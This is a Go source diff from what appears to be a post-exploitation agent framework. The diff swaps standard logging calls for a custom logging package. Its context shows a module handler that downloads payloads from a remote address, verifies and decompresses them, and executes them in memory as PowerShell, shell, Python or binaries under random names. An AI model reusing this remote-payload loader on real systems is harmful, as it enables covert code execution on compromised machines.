@@ -2,13 +2,14 @@ package modules
 
 import (
 	"fmt"
-	"log"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"strconv"
 	"strings"
 	"time"
+
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
 	"github.com/jm33-m0/arc/v2"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
@@ -38,7 +39,7 @@ func ModuleHandler(download_addr, file_to_download, payload_type, modName, check
 		// in memory execution
 		payload_data, err = arc.DecompressXz(payload_data_downloaded)
 		if err != nil {
-			return fmt.Sprintf("decompressing %s: %v", file_to_download, err)
+			return logging.Sprintf("decompressing %s: %v", file_to_download, err)
 		}
 	} else {
 		// on disk execution
@@ -55,7 +56,7 @@ func ModuleHandler(download_addr, file_to_download, payload_type, modName, check
 	fields := strings.Fields(exec_cmd)
 	if !inMem {
 		if len(fields) == 0 {
-			return fmt.Sprintf("empty exec_cmd: %s (env: %v)", strconv.Quote(exec_cmd), env)
+			return logging.Sprintf("empty exec_cmd: %s (env: %v)", strconv.Quote(exec_cmd), env)
 		}
 		executable = fields[0]
 	}
@@ -65,15 +66,15 @@ func ModuleHandler(download_addr, file_to_download, payload_type, modName, check
 	case "powershell":
 		out, err := agentutils.RunPSScript(payload_data, env)
 		if err != nil {
-			return fmt.Sprintf("running powershell script: %s (%v)", out, err)
+			return logging.Sprintf("running powershell script: %s (%v)", out, err)
 		}
 		return out
 	case "bash":
 		executable = def.DefaultShell
-		log.Printf("shell executable: %s", executable)
+		logging.Printf("shell executable: %s", executable)
 		out, err := agentutils.RunShellScript(payload_data, env)
 		if err != nil {
-			return fmt.Sprintf("running shell script: %s (%v)", out, err)
+			return logging.Sprintf("running shell script: %s (%v)", out, err)
 		}
 		return out
 	case "python":
@@ -82,7 +83,7 @@ func ModuleHandler(download_addr, file_to_download, payload_type, modName, check
 		if inMem {
 			out, err := agentutils.RunPythonScript(payload_data, env)
 			if err != nil {
-				return fmt.Sprintf("running python script: %s (%v)", out, err)
+				return logging.Sprintf("running python script: %s (%v)", out, err)
 			}
 			return out
 		}
@@ -95,9 +96,9 @@ func ModuleHandler(download_addr, file_to_download, payload_type, modName, check
 				// when implementing the module, you can read the arguments from env
 				out, err = exeutil.InMemExeRun(payload_data, []string{randName}, env)
 				if err != nil {
-					out = fmt.Sprintf("InMemExeRun: %v", err)
+					out = logging.Sprintf("InMemExeRun: %v", err)
 				}
-				outChan <- fmt.Sprintf("Success\n%s", out)
+				outChan <- logging.Sprintf("Success\n%s", out)
 			}()
 			select {
 			case out = <-outChan:
@@ -115,7 +116,7 @@ func ModuleHandler(download_addr, file_to_download, payload_type, modName, check
 	// interactive modules
 	if executable == "echo" {
 		out = crypto.SHA256SumRaw([]byte(def.MagicString))
-		log.Printf("echo: %s", out)
+		logging.Printf("echo: %s", out)
 		return
 	}
 
@@ -124,16 +125,16 @@ func ModuleHandler(download_addr, file_to_download, payload_type, modName, check
 		defer os.Chdir(common.RuntimeConfig.AgentRoot)
 		err = os.Chdir(modDir)
 		if err != nil {
-			return fmt.Sprintf("cd to %s: %v", modDir, err)
+			return logging.Sprintf("cd to %s: %v", modDir, err)
 		}
 	}
 	cmd := exec.Command(executable, args...)
 	cmd.Env = env
-	log.Printf("Running %v (%v)", cmd.Args, cmd.Env)
+	logging.Printf("Running %v (%v)", cmd.Args, cmd.Env)
 	outBytes, err := cmd.CombinedOutput()
 	out = string(outBytes)
 	if err != nil {
-		return fmt.Sprintf("running %s: %s (%v)", strconv.Quote(exec_cmd), out, err)
+		return logging.Sprintf("running %s: %s (%v)", strconv.Quote(exec_cmd), out, err)
 	}
 
 	return out
@@ -175,7 +176,7 @@ func downloadAndVerifyModule(file_to_download, checksum, download_addr string) (
 	}
 
 	if crypto.SHA256SumRaw(data) != checksum {
-		log.Print("Checksum failed, restarting...")
+		logging.Print("Checksum failed, restarting...")
 		util.TakeABlink()
 		os.RemoveAll(file_to_download)
 		return downloadAndVerifyModule(file_to_download, checksum, download_addr) // Recursive call
